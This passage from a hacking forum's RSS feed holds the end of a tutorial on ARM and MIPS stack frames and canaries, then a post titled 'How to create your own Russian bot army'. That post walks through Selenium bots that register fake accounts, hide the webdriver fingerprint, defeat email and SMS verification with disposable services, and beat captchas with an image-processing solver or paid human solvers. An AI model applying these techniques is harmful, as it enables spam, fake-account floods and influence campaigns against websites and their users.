<p>The first thing we must note is that the function prologue and epilogue are now different. For this function, the compiler has generated code to store the <code>fp</code> and <code>lr</code> registers in the stack (see the first push… yes, ARM allows you to push multiple registers in just one instruction). This means that… the return address will be stored in the stack and therefore… it can be overwritten… Yes, for a while you thought that smashing the stack will not work for ARM because the return address is stored in a register… don’t you?</p>
<p>Actually, this works fine for calling just one function. In the general case, when a function is called and it also calls other functions (nested functions), we need to store the value of this register somewhere we can recover it at some point (actually when we return from the inner function), to return to the right place in the program. And the place for doing that is in the stack… normally. What if we store <code>fp</code> and <code>lr</code> somewhereelse?.. May that mitigate buffer overflows?.. :think:</p>
<blockquote>
<p>ARM differentiates between leaf and non-leaf functions. A leaf function is a function that doesn’t call any other function. Basically this means that we do not need to store the Link Register to return from the function (as far as we do not modify it in the function body). Non-leaf functions needs to store the return address stored in the Link Register and they do this usually in the stack frame pointed by register <code>fp</code>. There are also special instructions for calling those.</p>
</blockquote>
<p>Now, take a look the the epilogue. Instead or branching (jumping) as in <code>func1</code>, in this case we just pop <code>lr</code> directly on the Program Counter register… effectively changing the program flow.</p>
<p>We can also see how the buffer is allocated substracting a value from <code>sp</code>. Note that this is ARM 32bits (all opcodes are 32bits and everything is 32bits aligned) so the stack is likely 8 bytes aligned. You can try to check this by yourself</p>
<p>Finally, note that the canary implementation follows the same concept that we discussed for the Intel processors… it is just stored somewhere else</p>
<h1><a name="p-59270-the-mips-case-22" class="anchor" href="https://d.clarkee.co.uk#p-59270-the-mips-case-22"></a>The MIPS Case</h1>
<p>For completeness, less recompile our test programs for MIPS and check how all this is done for those processors:</p>
<pre><code class="lang-auto">$ mips-linux-gnu-gcc -o local_vars-mips local_vars.c
$ mips-linux-gnu-objdump -d local_vars-mips

</code></pre>
<h2><a name="p-59270-func1-for-mips-23" class="anchor" href="https://d.clarkee.co.uk#p-59270-func1-for-mips-23"></a><code>func1</code> for MIPS</h2>
<p>This is how <code>func1</code> for MIPS looks like:</p>
<pre><code class="lang-auto">004007b0 &lt;func1&gt;:
  4007b0:       27bdfff0        addiu   sp,sp,-16
  4007b4:       afbe000c        sw      s8,12(sp)
  4007b8:       03a0f025        move    s8,sp
  4007bc:       24020010        li      v0,16
  4007c0:       a3c20007        sb      v0,7(s8)
  4007c4:       93c20007        lbu     v0,7(s8)
  4007c8:       24420001        addiu   v0,v0,1
  4007cc:       03c0e825        move    sp,s8
  4007d0:       8fbe000c        lw      s8,12(sp)
  4007d4:       27bd0010        addiu   sp,sp,16
  4007d8:       03e00008        jr      ra
  4007dc:       00000000        nop

</code></pre>
<p>The first thing we notice is that registers are named differently. We already knew that, don’t we? Just looking to the code, and without much knowledge about the MIPS architecture we can already identify the prologue and the epilogue of the function. The <code>sp</code> register is of course the Stack Pointer, and we see how space is allocated and free at the beginning and the end of the function.</p>
<p>Also, we can infer from the code that register <code>s8</code> is the one used as frame pointer, at least for this version of gcc. The prologue of the function adjusts <code>sp</code>, stores <code>s8</code> (our frame pointer) in the top of the stack and then sets <code>s8</code> to the bottom of the stack, so local variables are indexed with positive indexes.</p>
<p>The epilogue restores the <code>sp</code> value (frees memory <code>addiu sp,sp,16</code>), restores <code>s8</code> (<code>lw s8, 12(sp)</code> lw - <em>Load World</em>) and returns. As it happens with ARM, the return address (that’s where the <code>ra</code> register takes its name, I told you to remember that name) is stored in a register instead of in the stack, and return from a function is performed just jumping back to the content of <code>ra</code> (<code>jr</code> stands for <em>Jump Register</em>).</p>
<p>Just in case you are not familiar with the indexed notation used by <code>objdump</code> for MIPS. The value <code>7(s8)</code> means in Intel mnemonics <code>[s8 + 7]</code> as we already know that <code>s8</code> is our <code>RBP</code> for MIPS, we see the usual pattern to access local variables. Just note that in this case we first update <code>sp</code> and then we set <code>s8</code> instead of setting <code>s8</code> and then updating <code>sp</code> as we have seen for the Intel platform. This is way the MIPS code uses positive indexes and the intel one uses negative indexes.</p>
<h2><a name="p-59270-func3-for-mips-24" class="anchor" href="https://d.clarkee.co.uk#p-59270-func3-for-mips-24"></a><code>func3</code> for MIPS</h2>
<p><code>func3</code> is more interesting as we know, so let’s take a look to how it looks like for a MIPS processor:</p>
<pre><code class="lang-auto">0040082c &lt;func3&gt;:
  40082c:       27bdff60        addiu   sp,sp,-160
  400830:       afbf009c        sw      ra,156(sp)
  400834:       afbe0098        sw      s8,152(sp)
  400838:       03a0f025        move    s8,sp
  40083c:       3c1c0042        lui     gp,0x42
  400840:       279c9010        addiu   gp,gp,-28656
  400844:       afbc0010        sw      gp,16(sp)
  400848:       afc400a0        sw      a0,160(s8)
  40084c:       afc500a4        sw      a1,164(s8)
  400850:       8f82804c        lw      v0,-32692(gp)
  400854:       8c420000        lw      v0,0(v0)
  400858:       afc20094        sw      v0,148(s8)
  40085c:       00000000        nop
  400860:       8f82804c        lw      v0,-32692(gp)
  400864:       8fc30094        lw      v1,148(s8)
  400868:       8c420000        lw      v0,0(v0)
  40086c:       10620005        beq     v1,v0,400884 &lt;func3+0x58&gt;
  400870:       00000000        nop
  400874:       8f828048        lw      v0,-32696(gp)
  400878:       0040c825        move    t9,v0
  40087c:       0320f809        jalr    t9
  400880:       00000000        nop
  400884:       03c0e825        move    sp,s8
  400888:       8fbf009c        lw      ra,156(sp)
  40088c:       8fbe0098        lw      s8,152(sp)
  400890:       27bd00a0        addiu   sp,sp,160
  400894:       03e00008        jr      ra
  400898:       00000000        nop

</code></pre>
<p>For <code>func3</code> as we had already seen for the previous architectures, the compiler generates code to store not just the frame pointer but also the return address. Also note the stack allocation size adjustment done by the compiler to keep properly alignment stack memory.</p>
<p>The function epilogue is the complementary. We restore <code>sp</code>, then recover the values for <code>ra</code> and <code>s8</code>… give the stack memory back, updating the <code>sp</code> register and finally returning to the value contained on <code>ra</code>.</p>
<p>The canaries are managed slightly differently, but overall we can see how the value is retrieved from a special memory location identified by the <code>gp</code> register. This register is intended to point to the middle of a 64K block of memory located in the heap and intended to store constants and local variables… Not the same thing that a segment register (remember <code>fs</code> on Intel) but fullfill the function.</p>
<h1><a name="p-59270-conclusions-25" class="anchor" href="https://d.clarkee.co.uk#p-59270-conclusions-25"></a>Conclusions</h1>
<p>This is it for this part. This time we had learn how functions are implemented and the role the stack play on software. Also we had also found out why buffer overflows are dangerous and how canaries can be used to detect those overflows and prevent the exploitation of those bugs.</p>
<p>Finally we took a look to how all this looks for ARM and MIPS just to find that… they work roughly the same way <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
            <p><small>7 posts - 6 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/programming-for-wannabes-part-iv/22421">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/programming-for-wannabes-part-iv/22421</link>
          <pubDate>Sun, 26 Jul 2020 15:04:59 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-22421</guid>
          <source url="https://d.clarkee.co.uk/t/programming-for-wannabes-part-iv/22421.rss">Programming for Wannabes. Part IV</source>
        </item>
        <item>
          <title>How to create your own Russian bot army</title>
          <dc:creator><![CDATA[x24whoami24]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <h1>How to create your own Russian bot army</h1>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7d9e5cbade161fd55a5fe1fcff332ccad23e8a7c.png" alt="" data-base62-sha1="hVgYlplvefJMRsJKC8pcL8RvA3q" width="380" height="406"></p>
<p>Today, everywhere we look we hear talks about Russian bots taking over the internet.</p>
<p>From tampering with the US Election to spreading fake news and Pro Russian views on Facebook and Twitter.</p>
<p>I even found out they have <a href="https://en.wikipedia.org/wiki/Russian_web_brigades" rel="noopener nofollow ugc">their own Wikipidea page!</a></p>
<p>This got me really interested in the subject of bots and after many fun experiments i can finally share with you how with little effort, you too can have your own bot army!</p>
<p>What i will go over in this post:</p>
<p>How create a bot that performs actions on a given website</p>
<p>Detecting if a website is vulnerable to bot actions</p>
<p>Bypassing Captchas and Login Security measurements</p>
<p>Recommended Prerequisites:</p>
<ul>
<li>Basic understanding of HTML and Javascript</li>
<li>Basic understanding of HTTP</li>
<li>Basic development in python</li>
</ul>
<h2>Disclaimer</h2>
<p>I condemn the use of any information in this article for malicious bot activity,</p>
<p>The information in this article is to be used for learning purposes only</p>
<hr>
<h2>The good old bot days</h2>
<p>In the good old bot creating days, it was enough to write a simple script that sends HTTP POST and GET requests a website in order to imitate the behavior of a standard user on the website.</p>
<p>Today things are much more complicated, websites use many Javascript scripts on their pages, these scripts are then loaded and executed on the Browser of the user using the website and are used to traverse and communicate with the website properly .</p>
<p>The simple HTTP GET and POST bot scripts won’t work in the current websites because the Javascript code needs to run on a proper browser or else it won’t be executed , this can cause many errors and malfunctions that cripples any bot activity that operates in the old method.</p>
<p>The easy way to counter this problem is to switch from automating HTTP GET and POST requests to automating the browser in itself.</p>
<h2>Selenium: your partner in crime</h2>
<h3>What is Selenium?</h3>
<p><a href="https://www.selenium.dev/" rel="noopener nofollow ugc">Selenium</a> is a framework for testing web applications.</p>
<p>Selenium allows us to automate actions on browsers with a feature called Selenium WebDriver.</p>
<p>This driver accepts commands from the user and sends them to the browser to be executed.</p>
<p>These commands include:</p>
<ul>
<li>Typing keys in text boxes</li>
<li>Clicking objects and buttons on a webpage</li>
<li>Surfing to a webpage</li>
<li>simulating mouse cursor movement and dragging objects</li>
<li>Many more…</li>
</ul>
<p>Selenium WebDriver currently supports automation with the following web browsers:</p>
<p>Chrome, Firefox, Safari, Edge, Internet Explorer</p>
<h3>Using Selenium</h3>
<p>Selenium is very fun and easy to use, it has a well documented <a href="https://selenium-python.readthedocs.io/" rel="noopener nofollow ugc">user guide</a> that explains how to perform many automation actions using any of it’s supported browsers</p>
<p>I will show an example of using Selenium in Python:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/461e953e239faf2ca7026180e23aaaaf715f9762.png" alt="" data-base62-sha1="a0iWGYdk1Glg0ADNC9A0oMJSHiW" width="485" height="70"></p>
<p>The code above will open a chrome browser and navigate to the link.</p>
<p>We will reach the following webpage:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/c/c45aaf39939e612f45cda8a4ecca988b9bda5ac9.png" data-download-href="/uploads/short-url/s11SeHRYwxmAM3zxofhqywxi1El.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c45aaf39939e612f45cda8a4ecca988b9bda5ac9_2_602x344.png" alt="" data-base62-sha1="s11SeHRYwxmAM3zxofhqywxi1El" width="602" height="344" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c45aaf39939e612f45cda8a4ecca988b9bda5ac9_2_602x344.png, https://0x00sec.s3.amazonaws.com/original/2X/c/c45aaf39939e612f45cda8a4ecca988b9bda5ac9.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/c/c45aaf39939e612f45cda8a4ecca988b9bda5ac9.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c45aaf39939e612f45cda8a4ecca988b9bda5ac9_2_10x10.png"></a></div><p></p>
<p>This website can be used to test mouse actions that are performed by the user.</p>
<p>Interacting with website elements:</p>
<p>Let’s make our bot click the left click button in the mouse testing website.</p>
<p>To perform clicks and keyboards typing with website elements, we must find the element we wish to interact with and then perform our action.</p>
<p>One of the easiest ways to find the element we wish to interact with is by right clicking on the element we wish to interact with and clicking on inspect.</p>
<p>This action will show will open the html element’s code</p>
<p>We will then select copy-&gt;copy xpath to copy the XPath of the element.</p>
<p>XPath is an xml expression that we can use to navigate through different elements on a given webpage</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/9/9bb4a61677c88f5fcc999741681daefd611ca2d6.png" data-download-href="/uploads/short-url/mdr2RnZG8NUMhH8DqbZc26rKfrg.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/9/9bb4a61677c88f5fcc999741681daefd611ca2d6_2_602x235.png" alt="" data-base62-sha1="mdr2RnZG8NUMhH8DqbZc26rKfrg" width="602" height="235" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/9/9bb4a61677c88f5fcc999741681daefd611ca2d6_2_602x235.png, https://0x00sec.s3.amazonaws.com/optimized/2X/9/9bb4a61677c88f5fcc999741681daefd611ca2d6_2_903x352.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/9/9bb4a61677c88f5fcc999741681daefd611ca2d6_2_1204x470.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/9bb4a61677c88f5fcc999741681daefd611ca2d6_2_10x10.png"></a></div><p></p>
<p>we can then search for this element with Selenium and click it:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/031652aad9acd4ea2bb95737eb04ba6e0697aa5f.png" alt="" data-base62-sha1="rjg3LQOoTUA4iHpruxVXlrOlhJ" width="602" height="60"></p>
<p>It’s possible to chain together many actions on different website elements and create fully automated bot activities .</p>
<p>An example of a behaviour of a comment leaving bot on an E-Commerce website</p>
<p>that only allows members to leave comments:</p>
<p>1.Surf to E-Commerce registration page</p>
<p>2.Click on the registration text boxes to type a fake generated username and password</p>
<p>3.Click on the register button</p>
<p>4.Surf to a product webpage</p>
<p>5.Click on the comment text box and write a comment</p>
<p>Bypassing simple bot detection techniques</p>
<p>Many websites have an array of techniques that can be used to counter bot activity.</p>
<p>One of the easiest ways they can detect bots using Selenium is by looking for fingerprints left by the software.</p>
<p>One example of such fingerprint:</p>
<p>When a web browser is run by Selenium, a property named webdriver is added to the browser’s navigator variable and is set to true.</p>
<p>If we press F12 and write this property in a Selenium controlled browser we will see the following result:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/22754606eaf6a34c08c8da304471721656438963.png" alt="" data-base62-sha1="4UPusWYbyA1V4KZSBGEuPLcbNOX" width="413" height="226"></p>
<p>If we preform the same action on a normal user controlled browser, the result will look like this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3857a244f4c8a3958cb2f0c89db66db69260d3d0.png" alt="" data-base62-sha1="82quzdSQRejaBe2dgtBkw5x88mI" width="243" height="109"></p>
<p>Website’s can easily detect this value using Javascript code and realize that the user using the website is in fact a Selenium bot, this might cause the website  to limit the user from pefroming certain actions and it might even cause his account to be blocked account entirely in extreme cases .</p>
<p>An easy fix to counter this problem is to execute the following command which will set this webdriver property to undefined each time a new webpage is loaded.<br>
This will cause the Selenuim controlled browser to appear like in any normal user controlled browser:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a6682d742ff517af52f6341adb48cb38109b31df.png" alt="" data-base62-sha1="nK6sudJaNPvzd8uw2XfW9PsXxn1" width="552" height="179"></p>
<p>Websites might use additional techniques to detect bot detection.</p>
<p>These include:</p>
<ul>
<li>Tracking Mouse cursor movements - not moving the cursor on the website might be a red flag for the website</li>
<li>Comparing Activity - comparing the bot’s activity to that of an average user</li>
<li>Keystroke Speed - comparing keystroke speed to that of an average user</li>
</ul>
<p>All of these techniques can be bypassed by programming our bot to act in certain ways that simulate real human behaviour.</p>
<p>We can make the keystrokes slower, add mistakes to our clicks and even just move the mouse around to click different tabs on the website to make it seem like a normal curious user.</p>
<p>With a bit of coding, your bot can become a real boy <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<hr>
<h2>Spotting ideal websites for bots</h2>
<p>If you’re struggling to decide which next website your bot army should invade, it’s important to look out for these points in order to find the website that will allow you the most control over your’e bot users.</p>
<h3>User Registration</h3>
<p>Normally, we will want our bots to be registered to our target website.</p>
<p>Registered user’s have additional features and each bot that successfully registered to the website equals more power in your hands over the website.</p>
<p>Secured websites usually have one or more of the following methods to eliminate/mitigate multiple user registrations from the same person. We will go over each method and discuss if and how we can overcome it</p>
<h3>Method 1: Verifying Emails</h3>
<p>Websites will often require you to enter an email address when registering with a new account, they will then send a verification mail to the same email address and activate your account only if you pressed the verification link.</p>
<p>This can be bypassed very easily by using one of the following temporary mail websites:</p>
<p><a href="https://temp-mail.org/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://temp-mail.org/</a></p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://fdn.r.worldssl.net/img/favicon.ico" class="site-icon" width="113" height="114">
      <a href="https://www.fakemail.net/" target="_blank" rel="noopener nofollow ugc">FakeMail</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:210/213;"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fa561a209a665c02f175bb74bc5fa77ff18738d7.png" class="thumbnail" width="210" height="213"></div>

<h3><a href="https://www.fakemail.net/" target="_blank" rel="noopener nofollow ugc">FakeMail | Disposable Temp Mail</a></h3>

<p>The temp mail address to keep your original email safe. The disposable temporary email platform provides fleeting email addresses.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://10minutemail.com/" target="_blank" rel="noopener nofollow ugc">10minutemail.com</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://10minutemail.com/" target="_blank" rel="noopener nofollow ugc">10 Minute Mail - Free Anonymous Temporary email - 10 Minute Mail - Free...</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Each bot that wishes to register can go to one of the temporary mail websites, extract its own temporary mail address and register with it on the target website.</p>
<p>The bot can then go back to the mail website and click the verification link that was sent to mail address, by doing so the account will be registered and activated successfully</p>
<h3>Method 2: Phone numbers</h3>
<p>Websites registration sometimes requires a phone number to be entered.</p>
<p>Sometimes this field is only used by the website for ad purposes and entering a fake Mongolian number in the phone number field is enough to bypass this.</p>
<p>Other times, the website will require you to verify your account by entering a code that will be sent to that number.</p>
<p>This is a harder method to bypass as you will need to match a phone number for each bot you wish to register on the website.</p>
<p>It’s possible to use online websites that receive SMS codes and display them in order to automate the process of registering, reading the SMS code that was to the number and entering it on the website for verification.</p>
<p>The following websites are recommended for this purpose:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://receive-smss.com/" target="_blank" rel="noopener nofollow ugc">Receive SMS Online</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://receive-smss.com/" target="_blank" rel="noopener nofollow ugc">Receive SMS online for Free - without any Registration</a></h3>

<p>receive-smss.com is a free website to receive SMS and voice mail online. You can use it from all the countries and for Gmail,Facebook,Linked and more</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://cdn.sms24.me/favicon.ico" class="site-icon" width="236" height="236">
      <a href="https://sms24.me/" target="_blank" rel="noopener nofollow ugc">SMS24.me</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5d02ee201c58e8867d1c0d5c49b224bbdef0750a.png" class="thumbnail onebox-avatar" width="236" height="236">

<h3><a href="https://sms24.me/" target="_blank" rel="noopener nofollow ugc">Receive SMS Online | Temporary Phone Numbers</a></h3>

<p>No Registration. Receive SMS online FREE using our disposable/temporary numbers from  USA, Canada, UK, Russia, Ukraine, Israel and other countries. Receive anonymous verification code from around the world.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>In the next section, we will go over a more advanced method that websites use as a direct countermeasure against bot activity and we will show different methods to combat it.</p>
<hr>
<h2>Bypassing Captchas</h2>
<p>Captchas stand for - Completely Automated Public <a href="https://en.wikipedia.org/wiki/Turing_test" rel="noopener nofollow ugc">Turing test</a> to tell Computers and Humans Apart.</p>
<p>Captchas are used by various websites to prevent bots from simply logging in or registering to a website easily, they require the user to perform a test that is difficult to predict it’s answer, the reasoning is that humans will pass this test and bots won’t and that will allow the website to protect itself from any bot activity.</p>
<h3>Not all Captchas are created equal</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8836608a5f09f77de49a7bbfe90b7396a2f26081.png" alt="" data-base62-sha1="jqZrbea1sV8MoQYa0lvIxlxyG9b" width="348" height="269"></p>
<p>Let’s take the a look at Geetest’s slider captcha,</p>
<p>A popular captcha used by many websites to prevent bots from taking over.</p>
<p>Using Selenium and python image processing, I was able to create a program that can correctly answer the slider captcha about 30% of the time.</p>
<p>30% isn’t perfect but considering that the page can be refreshed and the captcha can be retaken several times, it results in the bot eventually answering the captcha correctly normally under a minute.</p>
<p>Imagine tens of thousands of bots bypassing the slider captcha after 3-4 attempts and registering to a website successfully, this scenario shows how this captcha is not effective against a massive bot activity and can be easily bypassed by any bot master who wishes to flood a website with his bots.</p>
<h3>What about ReCaptcha?</h3>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/7/713cdf8069be3f7ace19f0a5c9fb4761c2f5e7dc.png" data-download-href="/uploads/short-url/g9KnbWI1LkQqNYNQGyWkZShQP8M.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/7/713cdf8069be3f7ace19f0a5c9fb4761c2f5e7dc_2_492x312.png" alt="" data-base62-sha1="g9KnbWI1LkQqNYNQGyWkZShQP8M" width="492" height="312" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/7/713cdf8069be3f7ace19f0a5c9fb4761c2f5e7dc_2_492x312.png, https://0x00sec.s3.amazonaws.com/optimized/2X/7/713cdf8069be3f7ace19f0a5c9fb4761c2f5e7dc_2_738x468.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/7/713cdf8069be3f7ace19f0a5c9fb4761c2f5e7dc.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/713cdf8069be3f7ace19f0a5c9fb4761c2f5e7dc_2_10x10.png"></a></div><p></p>
<p>Google’s ReCaptchas is the most popular and well known captcha software,</p>
<p>It’s present on most websites today, it’s extremely difficult to solve and even humans have a hard time answering it sometimes.</p>
<p>A cheap and easy way of bypassing google’s ReCaptchas can be found not by attempting more complicated image processing but actually by harnessing the smartest thing we have besides that - the human brain.</p>
<p>There are multiple services which offer captcha solving solutions for very cheap prices,</p>
<p>Services like AntiCaptcha and 2Captcha have workers who are trained at solving the most difficult captchas at minimum speed,the pricing is between 1$ to 3$ for 1000 ReCaptchas</p>
<p>And it can be used by any bot master to enable his bot army to take over the most Captcha secured websites for a cheap amount…</p>
<hr>
<h2>Conclusions</h2>
<p>Today we went over the basics to creating your first bot army,</p>
<p>We examined how old bot armies operated and we talked about the differences in how to operate bots today in modern websites.</p>
<p>We then reviewed and discussed different security measures websites might use upon registration to the website and how some can still be bypassed automatically by bots</p>
<p>Finally, we talked about the most advanced countermeasure against bots - Captchas.</p>
<p>We went over different techniques to overcome Captchas and learned along the way that not all captchas are created equal.</p>
<p>I hope you all enjoyed this article, i’d like to end with a quote from <a href="https://inspirobot.me/" rel="noopener nofollow ugc">our friendly internet<br>
quote generating bot</a>.</p>
<p>“If you try, you can be the first to prove something that the rest of the world refuses to prove”</p>
<h3>Sources:</h3>
<p>ReCaptcha Solving Websites</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://anti-captcha.com/favicon.ico" class="site-icon" width="16" height="16">
      <a href="https://anti-captcha.com/" target="_blank" rel="noopener nofollow ugc">anti-captcha.com</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/361;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/c/9c4d505c1d599ee781d1d95f92ee2b1cf59bf8b2_2_690x361.png" class="thumbnail" width="690" height="361" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/c/9c4d505c1d599ee781d1d95f92ee2b1cf59bf8b2_2_690x361.png, https://0x00sec.s3.amazonaws.com/optimized/3X/9/c/9c4d505c1d599ee781d1d95f92ee2b1cf59bf8b2_2_1035x541.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/9/c/9c4d505c1d599ee781d1d95f92ee2b1cf59bf8b2.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/9/c/9c4d505c1d599ee781d1d95f92ee2b1cf59bf8b2_2_10x10.png"></div>

<h3><a href="https://anti-captcha.com/" target="_blank" rel="noopener nofollow ugc">Anti Captcha: captcha solving service. Bypass reCAPTCHA, FunCaptcha, image...</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/b/4/b4eb35342f62915a11ee04c78026efc882bfe510.png" class="site-icon" width="32" height="32">
      <a href="https://2captcha.com/?from=9669456" target="_blank" rel="noopener nofollow ugc">2captcha.com</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:493/353;"><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/d/2da5e069c3f997d2b75d4fd228ada94fc5635a16.png" class="thumbnail" width="493" height="353"></div>

<h3><a href="https://2captcha.com/?from=9669456" target="_blank" rel="noopener nofollow ugc">Online CAPTCHA Solving and Image Recognition Service.</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Code:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/peduajo/geetest-slice-captcha-solver" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d034f442e72729c9617a30b5426468e4f9693879.jpeg" class="thumbnail onebox-avatar" width="400" height="400">

<h3><a href="https://github.com/peduajo/geetest-slice-captcha-solver" target="_blank" rel="noopener nofollow ugc">peduajo/geetest-slice-captcha-solver</a></h3>

<p>Solver for the geetest sliding captcha. Contribute to peduajo/geetest-slice-captcha-solver development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/x24whoamix24/bypass_geetest_slider" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/6/63998b26295261f34c9e0b5334ec0502f106835d.jpeg" class="thumbnail onebox-avatar" width="400" height="400">

<h3><a href="https://github.com/x24whoamix24/bypass_geetest_slider" target="_blank" rel="noopener nofollow ugc">x24whoamix24/bypass_geetest_slider</a></h3>

<p>Code that bypasses geetest slider captchas using Selenuim and python image processing - x24whoamix24/bypass_geetest_slider</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox wikipedia">
  <header class="source">
      <a href="https://he.wikipedia.org/wiki/CAPTCHA" target="_blank" rel="noopener nofollow ugc">he.wikipedia.org</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:250/69;"><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d3a6fb72018b4127e7c21e5b772acff51b1ddf7e.jpeg" class="thumbnail" width="250" height="69"></div>

<h3><a href="https://he.wikipedia.org/wiki/CAPTCHA" target="_blank" rel="noopener nofollow ugc">CAPTCHA</a></h3>

<p>CAPTCHA במחשבים הוא מבחן אתגר מענה (challenge-response) שמטרתו להבטיח שהתשובה אינה מופקת באמצעות מחשב. במנגנון מעורב בדרך כלל מחשב המייצר שאלה אקראית, כזו שלאדם קל לענות עליה אך למחשב קשה מאוד. מבחן CAPTCHA בדרך כלל מבקש מהמשתמש להקליד אותיות או מספרים המופיעים בצורה מעוותת על המסך.
 CAPTCHA הוא סוג של מבחן טיורינג, שבו מחשב ממונה על הבדלה בין אדם למחשב, בשונה ממבחן טיורינג הקלאסי בו אדם באמצעות שיחה ושאלות מנסה להבדיל בין מחשב לאדם.
 את השם CAPTCHA טבעו לראשונה לואי פון אהן, מנואל בלום, ניקולאס ...</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://www.geetest.com/static/imgs/favicon.ico" class="site-icon" width="128" height="128">
      <a href="https://www.geetest.com/en/demo" target="_blank" rel="noopener nofollow ugc">geetest.com</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://www.geetest.com/en/demo" target="_blank" rel="noopener nofollow ugc">GeeTest CAPTCHA | Demo</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            <p><small>6 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/how-to-create-your-own-russian-bot-army/22370">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/how-to-create-your-own-russian-bot-army/22370</link>
          <pubDate>Fri, 24 Jul 2020 07:33:13 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
